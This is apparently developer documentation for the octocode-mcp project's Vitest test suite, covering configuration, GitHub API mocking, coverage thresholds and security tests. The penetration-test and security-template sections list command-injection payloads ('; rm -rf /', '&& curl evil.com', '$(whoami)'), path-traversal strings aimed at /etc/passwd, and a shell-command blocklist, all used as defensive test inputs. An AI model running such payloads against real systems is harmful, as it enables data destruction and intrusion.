# Testing System

The octocode-mcp project uses Vitest as its testing framework with comprehensive test coverage across unit, integration, and security tests. The test suite ensures code quality, reliability, and security.

## Table of Contents

- [Test Framework and Configuration](#test-framework-and-configuration)
- [Test Directory Structure](#test-directory-structure)
- [GitHub API Test Mocking](#github-api-test-mocking)
- [Security Test Organization](#security-test-organization)
- [Coverage Requirements](#coverage-requirements)
- [Running Tests](#running-tests)
- [Writing New Tests](#writing-new-tests)
- [Test Patterns and Best Practices](#test-patterns-and-best-practices)

## Test Framework and Configuration

### Vitest Configuration

Located in `vitest.config.ts`:

```typescript
import { defineConfig } from 'vitest/config';

export default defineConfig({
  test: {
    environment: 'node',
    globals: true,
    testTimeout: 2000,        // 2 seconds per test
    hookTimeout: 1000,         // 1 second for hooks
    teardownTimeout: 1000,     // 1 second for teardown
    dangerouslyIgnoreUnhandledErrors: true, // Ignore unhandled errors from mocks
    setupFiles: ['./tests/setup.ts'],
    coverage: {
      provider: 'v8',
      reporter: ['text', 'json', 'html'],
      include: ['src/**/*.ts'],
      exclude: [
        'src/**/*.test.ts',
        'src/**/*.spec.ts',
        'src/index.ts',        // Entry point with process handlers
        'src/types.ts',        // Type definitions only
        'src/**/*.d.ts',       // Type definition files
        'src/**/index.ts',     // Barrel exports
        'src/**/types.ts',     // Type-only files
        'src/public.ts',       // Public API exports
        'src/types/**/*.ts',   // Type definition folder
      ],
      thresholds: {
        statements: 90,
        branches: 90,
        functions: 90,
        lines: 90,
      },
    },
  },
});
```

### Key Configuration Details

- **Environment**: Node.js environment for all tests
- **Globals**: Vitest global APIs available without imports
- **Timeouts**: Short timeouts to catch slow tests early
- **Coverage Provider**: V8 for fast, accurate coverage
- **Coverage Threshold**: 90% across all metrics

## Test Directory Structure

The test suite is organized to mirror the source structure with additional categories:

```
tests/
├── commands/               # Command builder tests
│   ├── FindCommandBuilder.test.ts
│   ├── GrepCommandBuilder.test.ts
│   ├── LsCommandBuilder.test.ts
│   └── RipgrepCommandBuilder.test.ts
│
├── errors/                 # Error handling tests
│   └── errorCodes.test.ts
│
├── evals/                  # Evaluation and scoring tests
│   ├── baselines/
│   ├── prompts/
│   ├── scorers/
│   ├── utils/
│   └── octocode-eval.test.ts
│
├── fixtures/               # Test fixtures and helpers
│   └── mcp-fixtures.test.ts
│
├── github/                 # GitHub API tests
│   ├── api-caching.test.ts
│   ├── client.race.test.ts
│   ├── codeSearch.filtering.test.ts
│   ├── codeSearch.security.test.ts
│   ├── errors.test.ts
│   ├── fileOperations.branchRef.test.ts
│   ├── fileOperations.coverage.test.ts
│   ├── fileOperations.pagination.test.ts
│   ├── fileOperations.processContent.test.ts
│   ├── fileOperations.repoStructurePagination.test.ts
│   ├── fileOperations.timestamp.test.ts
│   ├── githubAPI.test.ts
│   ├── index.test.ts
│   ├── pullRequestSearch.coverage.test.ts
│   ├── queryBuilders.test.ts
│   └── repoSearch.test.ts
│
├── gitlab/                 # GitLab API tests
│   └── errors.test.ts
│
├── helpers/                # Test helper utilities
│   └── example.test.ts
│
├── hints/                  # Hint system tests
│   ├── dynamic.test.ts
│   └── index.test.ts
│
├── integration/            # Integration tests
│
├── lsp/                    # LSP client tests
│   ├── client.branches.test.ts
│   ├── client.coverage.test.ts
│   ├── client.handler.test.ts
│   ├── client.uri.test.ts
│   ├── resolver.test.ts
│   ├── symbols.test.ts
│   └── validation.test.ts
│
├── providers/              # Provider system tests
│   ├── github/
│   └── gitlab/
│
├── scheme/                 # Schema validation tests
│   ├── github_fetch_content.test.ts
│   ├── github_search_code.schema.test.ts
│   └── local_ripgrep.test.ts
│
├── security/               # Security tests
│   ├── commandValidator.test.ts
│   ├── contentSanitizer.test.ts
│   ├── exec-integration.test.ts
│   ├── executionContextValidator.test.ts
│   ├── ignoredPathFilter.test.ts
│   ├── investigate-bypasses.test.ts
│   ├── mask.branches.test.ts
│   ├── mask.test.ts
│   ├── pathValidator.extended.test.ts
│   ├── pathValidator.test.ts
│   ├── penetration-test.test.ts
│   ├── withSecurityValidation.basic.test.ts
│   ├── withSecurityValidation.extractRepoOwner.test.ts
│   ├── withSecurityValidation.extractResearchFields.test.ts
│   └── withSecurityValidation.logging.test.ts
│
├── tools/                  # Tool implementation tests
│   ├── toolMetadata/
│   ├── callback.error.test.ts
│   ├── callback.test.ts
│   ├── debug-proxy.test.ts
│   ├── github_search_code.filtering.test.ts
│   ├── github_search_code.match_modes.test.ts
│   ├── github_search_code.tool.test.ts
│   ├── github_search_pull_requests.pagination.test.ts
│   ├── github_search_pull_requests.test.ts
│   ├── github_search_repos.tool.test.ts
│   ├── github_search_repos_integration.test.ts
│   ├── github_search_repos_query_splitting.test.ts
│   ├── github_view_repo_structure.test.ts
│   ├── github_view_repo_structure_filters.test.ts
│   ├── hints.test.ts
│   ├── localSchemas.test.ts
│   ├── localToolsExecution.test.ts
│   ├── localToolsRegistration.test.ts
│   ├── local_fetch_content.test.ts
│   ├── local_find_files.test.ts
│   ├── local_ripgrep.test.ts
│   ├── lsp_call_hierarchy.coverage.test.ts
│   ├── lsp_call_hierarchy.impl.test.ts
│   ├── lsp_find_references.impl.test.ts
│   ├── lsp_goto_definition.coverage.test.ts
│   ├── lsp_goto_definition.impl.test.ts
│   ├── package_search.test.ts
│   ├── response_structure.test.ts
│   ├── toolConfig.branches.test.ts
│   ├── toolConfig.test.ts
│   ├── toolMetadata.branches.test.ts
│   ├── toolMetadata.edge.test.ts
│   ├── toolMetadata.final.test.ts
│   ├── toolMetadata.test.ts
│   └── toolNames.test.ts
│
├── types/                  # Type system tests
│   └── github-openapi.test.ts
│
├── utils/                  # Utility function tests
│   ├── minifier/
│   ├── parsers/
│   ├── commandAvailability.test.ts
│   ├── exec.test.ts
│   ├── responses.test.ts
│   └── safeExec.test.ts
│
├── index.logic.test.ts     # Server logic tests
├── index.startup.test.ts   # Server startup tests
├── session.edgecases.test.ts
├── session.test.ts
└── setup.ts                # Global test setup
```

### Test Categories

1. **Unit Tests**: Test individual functions and classes in isolation
2. **Integration Tests**: Test component interactions
3. **Security Tests**: Validate security measures and attack prevention
4. **Coverage Tests**: Tests specifically for branch and edge case coverage
5. **Schema Tests**: Validate Zod schemas and input validation

## GitHub API Test Mocking

GitHub API tests use comprehensive mocking to avoid real API calls and ensure deterministic results.

### Mock Setup Pattern

```typescript
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import type { Octokit } from 'octokit';

describe('GitHub Code Search', () => {
  let mockOctokit: Partial<Octokit>;

  beforeEach(() => {
    // Create mock Octokit instance
    mockOctokit = {
      rest: {
        search: {
          code: vi.fn().mockResolvedValue({
            data: {
              total_count: 1,
              items: [
                {
                  name: 'test.ts',
                  path: 'src/test.ts',
                  html_url: 'https://github.com/owner/repo/blob/main/src/test.ts',
                  repository: {
                    id: 123,
                    name: 'repo',
                    full_name: 'owner/repo',
                    html_url: 'https://github.com/owner/repo',
                  },
                  text_matches: [
                    {
                      fragment: 'function test() {}',
                      matches: [{ indices: [0, 8] }],
                    },
                  ],
                },
              ],
            },
            status: 200,
            headers: {},
            url: '',
          }),
        },
      },
    };
  });

  it('should search code successfully', async () => {
    const result = await searchGitHubCodeAPI(
      {
        keywordsToSearch: ['test'],
        owner: 'owner',
        repo: 'repo',
      },
      mockOctokit as Octokit
    );

    expect(result.data?.items).toHaveLength(1);
    expect(mockOctokit.rest?.search?.code).toHaveBeenCalledTimes(1);
  });
});
```

### Response Mocking

Mock different API responses:

```typescript
// Success response
mockOctokit.rest.repos.getContent = vi.fn().mockResolvedValue({
  data: {
    type: 'file',
    content: Buffer.from('test content').toString('base64'),
    encoding: 'base64',
    size: 12,
    sha: 'abc123',
  },
  status: 200,
});

// Error response - 404 Not Found
mockOctokit.rest.repos.getContent = vi.fn().mockRejectedValue({
  status: 404,
  message: 'Not Found',
  response: {
    data: { message: 'Not Found' },
    status: 404,
  },
});

// Rate limit error
mockOctokit.rest.repos.getContent = vi.fn().mockRejectedValue({
  status: 403,
  message: 'API rate limit exceeded',
  response: {
    data: {
      message: 'API rate limit exceeded',
      documentation_url: 'https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting',
    },
    status: 403,
    headers: {
      'x-ratelimit-remaining': '0',
      'x-ratelimit-reset': String(Math.floor(Date.now() / 1000) + 3600),
    },
  },
});
```

### Client Cache Testing

Test the GitHub client cache behavior:

```typescript
describe('GitHub Client Caching', () => {
  it('should cache clients per token', () => {
    const authInfo1 = { token: 'token1' };
    const authInfo2 = { token: 'token2' };

    const client1a = getOctokit(authInfo1);
    const client1b = getOctokit(authInfo1);
    const client2 = getOctokit(authInfo2);

    // Same token = same client instance
    expect(client1a).toBe(client1b);

    // Different token = different client instance
    expect(client1a).not.toBe(client2);
  });

  it('should expire cache after TTL', async () => {
    const authInfo = { token: 'test-token' };

    const client1 = getOctokit(authInfo);

    // Fast-forward time past TTL (5 minutes)
    vi.advanceTimersByTime(5 * 60 * 1000 + 1);

    const client2 = getOctokit(authInfo);

    // Should be different instances after expiry
    expect(client1).not.toBe(client2);
  });
});
```

### API Error Handling Tests

Test error transformation and handling:

```typescript
describe('GitHub Error Handling', () => {
  it('should handle 404 errors', async () => {
    mockOctokit.rest.repos.getContent = vi.fn().mockRejectedValue({
      status: 404,
      message: 'Not Found',
    });

    const result = await fetchGitHubFileContentAPI(
      { owner: 'owner', repo: 'repo', path: 'missing.ts' },
      mockOctokit
    );

    expect(result.error).toContain('not found');
    expect(result.status).toBe(404);
  });

  it('should extract rate limit info from errors', async () => {
    mockOctokit.rest.repos.getContent = vi.fn().mockRejectedValue({
      status: 403,
      response: {
        headers: {
          'x-ratelimit-remaining': '0',
          'x-ratelimit-reset': '1234567890',
        },
      },
    });

    const result = await fetchGitHubFileContentAPI(
      { owner: 'owner', repo: 'repo', path: 'file.ts' },
      mockOctokit
    );

    expect(result.error).toContain('rate limit');
    expect(result.rateLimitRemaining).toBe(0);
    expect(result.rateLimitReset).toBeDefined();
  });
});
```

## Security Test Organization

Security tests are extensively organized to validate all security measures.

### Path Validation Tests

Located in `tests/security/pathValidator.test.ts`:

```typescript
describe('PathValidator', () => {
  const testWorkspace = process.cwd();
  let validator: PathValidator;

  beforeEach(() => {
    validator = new PathValidator(testWorkspace);
  });

  describe('valid paths', () => {
    it('should accept paths within workspace', () => {
      const result = validator.validate(`${testWorkspace}/src/index.ts`);
      expect(result.isValid).toBe(true);
    });

    it('should accept paths in home directory', () => {
      const homeDir = os.homedir();
      const result = validator.validate(`${homeDir}/file.txt`);
      expect(result.isValid).toBe(true);
    });

    it('should accept additional roots', () => {
      const v = new PathValidator({
        workspaceRoot: testWorkspace,
        additionalRoots: ['/tmp'],
      });
      const result = v.validate('/tmp/test.txt');
      expect(result.isValid).toBe(true);
    });
  });

  describe('invalid paths', () => {
    it('should reject path traversal', () => {
      const result = validator.validate(`${testWorkspace}/../../../etc/passwd`);
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('outside allowed roots');
    });

    it('should reject absolute paths outside workspace', () => {
      const result = validator.validate('/etc/passwd');
      expect(result.isValid).toBe(false);
    });

    it('should reject symlinks to outside workspace', () => {
      // Create symlink pointing outside
      const symlinkPath = path.join(testWorkspace, 'symlink');
      fs.symlinkSync('/etc/passwd', symlinkPath);

      const result = validator.validate(symlinkPath);
      expect(result.isValid).toBe(false);

      // Cleanup
      fs.unlinkSync(symlinkPath);
    });
  });

  describe('edge cases', () => {
    it('should handle relative paths', () => {
      const result = validator.validate('./src/index.ts');
      expect(result.isValid).toBe(true);
      expect(result.resolvedPath).toContain('/src/index.ts');
    });

    it('should normalize paths with multiple slashes', () => {
      const result = validator.validate(`${testWorkspace}//src///index.ts`);
      expect(result.isValid).toBe(true);
    });

    it('should handle tilde expansion', () => {
      const result = validator.validate('~/file.txt');
      expect(result.isValid).toBe(true);
      expect(result.resolvedPath).toContain(os.homedir());
    });
  });
});
```

### Command Validation Tests

Located in `tests/security/commandValidator.test.ts`:

```typescript
describe('CommandValidator', () => {
  let validator: CommandValidator;

  beforeEach(() => {
    validator = new CommandValidator();
  });

  describe('allowed commands', () => {
    it('should allow ripgrep', () => {
      const result = validator.validate('rg');
      expect(result.isValid).toBe(true);
    });

    it('should allow find', () => {
      const result = validator.validate('find');
      expect(result.isValid).toBe(true);
    });

    it('should allow ls', () => {
      const result = validator.validate('ls');
      expect(result.isValid).toBe(true);
    });
  });

  describe('blocked commands', () => {
    it('should block shell commands', () => {
      const result = validator.validate('sh');
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('not allowed');
    });

    it('should block bash commands', () => {
      const result = validator.validate('bash');
      expect(result.isValid).toBe(false);
    });

    it('should block eval', () => {
      const result = validator.validate('eval');
      expect(result.isValid).toBe(false);
    });
  });

  describe('argument validation', () => {
    it('should reject shell metacharacters', () => {
      const result = validator.validateArgs(['test;rm -rf /']);
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('shell metacharacters');
    });

    it('should reject pipe operators', () => {
      const result = validator.validateArgs(['test', '|', 'cat']);
      expect(result.isValid).toBe(false);
    });

    it('should accept safe arguments', () => {
      const result = validator.validateArgs(['-name', '*.ts', '-type', 'f']);
      expect(result.isValid).toBe(true);
    });
  });
});
```

### Sensitive Data Masking Tests

Located in `tests/security/mask.test.ts`:

```typescript
describe('Sensitive Data Masking', () => {
  describe('API tokens', () => {
    it('should mask GitHub tokens', () => {
      const text = 'Token: ghp_1234567890abcdefghij1234567890ab';
      const masked = maskSensitiveData(text);
      expect(masked).not.toContain('ghp_1234567890abcdefghij1234567890ab');
      expect(masked).toMatch(/Token: g*p*1*3*5*7*9*a*c*e*g*i*1*3*5*7*9*a*/);
    });

    it('should mask GitLab tokens', () => {
      const text = 'Token: glpat-1234567890abcdef';
      const masked = maskSensitiveData(text);
      expect(masked).not.toContain('glpat-1234567890abcdef');
    });

    it('should mask AWS keys', () => {
      const text = 'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE';
      const masked = maskSensitiveData(text);
      expect(masked).not.toContain('AKIAIOSFODNN7EXAMPLE');
    });
  });

  describe('secrets', () => {
    it('should mask Bearer tokens', () => {
      const text = 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9';
      const masked = maskSensitiveData(text);
      expect(masked).not.toContain('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9');
    });

    it('should mask SSH keys', () => {
      const text = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC user@example.com';
      const masked = maskSensitiveData(text);
      expect(masked).not.toContain('AAAAB3NzaC1yc2EAAAADAQABAAABAQC');
    });
  });

  describe('edge cases', () => {
    it('should handle multiple secrets in one string', () => {
      const text = 'Token1: ghp_abc123 Token2: glpat-xyz789';
      const masked = maskSensitiveData(text);
      expect(masked).not.toContain('ghp_abc123');
      expect(masked).not.toContain('glpat-xyz789');
    });

    it('should preserve non-sensitive data', () => {
      const text = 'User: john@example.com Token: ghp_secret123';
      const masked = maskSensitiveData(text);
      expect(masked).toContain('john@example.com');
      expect(masked).not.toContain('ghp_secret123');
    });
  });
});
```

### Security Integration Tests

Located in `tests/security/exec-integration.test.ts`:

```typescript
describe('Security Integration', () => {
  it('should prevent command injection via find', async () => {
    const query = {
      path: '/tmp',
      name: '*.txt; rm -rf /',
    };

    await expect(
      async () => await executeFindCommand(query)
    ).rejects.toThrow(/not allowed/i);
  });

  it('should prevent path traversal via ripgrep', async () => {
    const query = {
      pattern: 'test',
      path: '../../../etc/passwd',
    };

    await expect(
      async () => await executeRipgrepCommand(query)
    ).rejects.toThrow(/outside allowed roots/i);
  });

  it('should sanitize output before returning', async () => {
    // Mock command that returns sensitive data
    vi.spyOn(childProcess, 'spawn').mockReturnValue({
      stdout: {
        on: (event: string, cb: (data: Buffer) => void) => {
          if (event === 'data') {
            cb(Buffer.from('Token: ghp_1234567890abcdefghij1234567890ab'));
          }
        },
      },
      stderr: { on: vi.fn() },
      on: (event: string, cb: (code: number) => void) => {
        if (event === 'close') cb(0);
      },
    } as any);

    const result = await executeRipgrepCommand({
      pattern: 'test',
      path: '/tmp',
    });

    expect(result).not.toContain('ghp_1234567890abcdefghij1234567890ab');
    expect(result).toMatch(/g*p*_*/);
  });
});
```

### Penetration Testing

Located in `tests/security/penetration-test.test.ts`:

```typescript
describe('Penetration Testing', () => {
  describe('Command Injection Attacks', () => {
    const injectionPayloads = [
      '; rm -rf /',
      '| cat /etc/passwd',
      '&& curl evil.com',
      '$(whoami)',
      '`id`',
      '\n/bin/sh',
    ];

    injectionPayloads.forEach((payload) => {
      it(`should block: ${payload}`, async () => {
        await expect(
          async () => await executeCommand('find', [payload])
        ).rejects.toThrow();
      });
    });
  });

  describe('Path Traversal Attacks', () => {
    const traversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32',
      '/etc/../etc/passwd',
      './../../sensitive',
    ];

    traversalPayloads.forEach((payload) => {
      it(`should block: ${payload}`, async () => {
        const result = pathValidator.validate(payload);
        expect(result.isValid).toBe(false);
      });
    });
  });

  describe('Token Extraction Attacks', () => {
    it('should not leak tokens in error messages', async () => {
      const error = new Error('GitHub API error with token: ghp_secret123');

      const sanitized = sanitizeError(error);

      expect(sanitized.message).not.toContain('ghp_secret123');
    });

    it('should not leak tokens in stack traces', () => {
      const stack = `
        Error: Failed to authenticate
          at getOctokit (client.ts:10:5)
          at token: ghp_secret123
          at async search (search.ts:20:3)
      `;

      const sanitized = maskSensitiveData(stack);

      expect(sanitized).not.toContain('ghp_secret123');
    });
  });
});
```

## Coverage Requirements

### Coverage Thresholds

All metrics must meet 90% threshold:

```typescript
coverage: {
  thresholds: {
    statements: 90,
    branches: 90,
    functions: 90,
    lines: 90,
  },
}
```

### Coverage Reports

- **Text**: Console output during test runs
- **JSON**: Machine-readable format for CI/CD
- **HTML**: Interactive browser-based report

### Excluded Files

Files excluded from coverage requirements:

1. **Test Files**: `*.test.ts`, `*.spec.ts`
2. **Entry Point**: `src/index.ts` (process handlers are hard to test)
3. **Type Definitions**: `*.d.ts`, `types.ts` files
4. **Barrel Exports**: `index.ts` files (re-exports only)
5. **Public API**: `src/public.ts` (exports only)

### Coverage Analysis

```bash
# Generate HTML coverage report
npm run test:coverage

# Open coverage report
open coverage/index.html
```

The HTML report shows:

- Overall coverage percentages
- File-by-file breakdown
- Line-by-line coverage visualization
- Uncovered branches and statements highlighted

## Running Tests

### Basic Commands

```bash
# Run all tests
npm test

# Run tests in watch mode
npm run test:watch

# Run tests with coverage
npm run test:coverage

# Run specific test file
npm test -- path/to/test.test.ts

# Run tests matching pattern
npm test -- --grep "GitHub API"
```

### CI/CD Integration

Tests run automatically on:

- Pull request creation
- Push to main branch
- Scheduled nightly builds

### Test Execution Flow

```
1. Setup Phase (setup.ts)
   - Initialize global mocks
   - Set up environment variables
   - Configure test utilities

2. Test Execution
   - Run test suites in parallel
   - Apply timeout limits
   - Collect coverage data

3. Reporting
   - Generate coverage reports
   - Check thresholds
   - Output results
```

### Environment Variables

Tests respect these environment variables:

```bash
# Skip integration tests
SKIP_INTEGRATION_TESTS=true npm test

# Use real GitHub API (not recommended)
USE_REAL_GITHUB_API=true npm test

# Enable debug logging
DEBUG=octocode:* npm test
```

## Writing New Tests

### Test File Structure

```typescript
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';

describe('Feature Name', () => {
  // Setup
  beforeEach(() => {
    // Initialize mocks and test data
  });

  afterEach(() => {
    // Cleanup
    vi.clearAllMocks();
  });

  describe('sub-feature', () => {
    it('should do something specific', () => {
      // Arrange
      const input = { /* test data */ };

      // Act
      const result = functionUnderTest(input);

      // Assert
      expect(result).toBe(expected);
    });

    it('should handle edge case', () => {
      // Test edge cases
    });

    it('should handle errors', () => {
      expect(() => functionUnderTest(invalidInput)).toThrow();
    });
  });
});
```

### Unit Test Template

```typescript
describe('UtilityFunction', () => {
  it('should process valid input correctly', () => {
    const result = utilityFunction('valid input');
    expect(result).toEqual(expectedOutput);
  });

  it('should handle empty input', () => {
    const result = utilityFunction('');
    expect(result).toEqual(defaultOutput);
  });

  it('should throw on invalid input', () => {
    expect(() => utilityFunction(null)).toThrow('Invalid input');
  });
});
```

### Integration Test Template

```typescript
describe('Tool Integration', () => {
  let mockClient: MockClient;

  beforeEach(() => {
    mockClient = createMockClient();
  });

  it('should complete full workflow', async () => {
    // Setup mock responses
    mockClient.mockResponse('/api/search', { results: [] });

    // Execute tool
    const result = await executeTool({
      query: 'test',
    }, mockClient);

    // Verify
    expect(result.isSuccess).toBe(true);
    expect(mockClient.requestCount).toBe(1);
  });
});
```

### Security Test Template

```typescript
describe('Security Feature', () => {
  const maliciousInputs = [
    '../../../etc/passwd',
    '; rm -rf /',
    '$(malicious_command)',
  ];

  maliciousInputs.forEach(input => {
    it(`should block malicious input: ${input}`, () => {
      expect(() => validateInput(input)).toThrow(/not allowed/i);
    });
  });

  it('should allow safe input', () => {
    expect(() => validateInput('safe.txt')).not.toThrow();
  });
});
```

## Test Patterns and Best Practices

### 1. AAA Pattern

Always follow Arrange-Act-Assert:

```typescript
it('should calculate total correctly', () => {
  // Arrange
  const items = [{ price: 10 }, { price: 20 }];

  // Act
  const total = calculateTotal(items);

  // Assert
  expect(total).toBe(30);
});
```

### 2. One Assertion Per Test (when possible)

```typescript
// Good
it('should return user name', () => {
  expect(user.getName()).toBe('John');
});

it('should return user email', () => {
  expect(user.getEmail()).toBe('john@example.com');
});

// Avoid (unless testing object structure)
it('should return user data', () => {
  expect(user.getName()).toBe('John');
  expect(user.getEmail()).toBe('john@example.com');
  expect(user.getAge()).toBe(30);
});
```

### 3. Mock External Dependencies

```typescript
// Good - mock external API
vi.mock('../../src/github/client.ts', () => ({
  getOctokit: () => mockOctokit,
}));

// Avoid - testing external API
it('should fetch from real GitHub', async () => {
  const result = await github.search('test');
  // Flaky, slow, requires network
});
```

### 4. Test Error Cases

```typescript
describe('error handling', () => {
  it('should handle network errors', async () => {
    mockClient.rejectWith(new NetworkError());

    await expect(
      fetchData()
    ).rejects.toThrow('Network error');
  });

  it('should handle invalid responses', async () => {
    mockClient.respondWith({ invalid: 'data' });

    await expect(
      fetchData()
    ).rejects.toThrow('Invalid response');
  });
});
```

### 5. Use Test Fixtures

```typescript
// tests/fixtures/users.ts
export const validUser = {
  id: 1,
  name: 'John Doe',
  email: 'john@example.com',
};

export const invalidUser = {
  id: -1,
  name: '',
  email: 'invalid-email',
};

// In test file
import { validUser, invalidUser } from '../fixtures/users';

it('should accept valid user', () => {
  expect(validateUser(validUser)).toBe(true);
});
```

### 6. Cleanup in afterEach

```typescript
describe('Resource Tests', () => {
  let resource: Resource;

  beforeEach(() => {
    resource = createResource();
  });

  afterEach(async () => {
    await resource.cleanup();
    vi.clearAllMocks();
  });
});
```

### 7. Use Descriptive Test Names

```typescript
// Good - describes what and why
it('should return 404 when user does not exist', () => {});
it('should cache results for 5 minutes', () => {});
it('should retry failed requests up to 3 times', () => {});

// Avoid - vague or redundant
it('works', () => {});
it('test user', () => {});
it('should test the function', () => {});
```

### 8. Group Related Tests

```typescript
describe('UserService', () => {
  describe('creation', () => {
    it('should create user with valid data', () => {});
    it('should reject duplicate emails', () => {});
  });

  describe('authentication', () => {
    it('should authenticate with correct password', () => {});
    it('should reject invalid password', () => {});
  });

  describe('updates', () => {
    it('should update user profile', () => {});
    it('should validate email before update', () => {});
  });
});
```

## Summary

The testing system in octocode-mcp provides:

- **Comprehensive Coverage**: 90% threshold across all metrics
- **Organized Structure**: Tests mirror source structure with clear categories
- **Security Focus**: Extensive penetration testing and validation
- **GitHub Mocking**: Deterministic API tests without real calls
- **Best Practices**: AAA pattern, descriptive names, proper cleanup
- **CI/CD Ready**: Automated execution with coverage reporting

This testing infrastructure ensures code quality, catches regressions early, and maintains security standards.
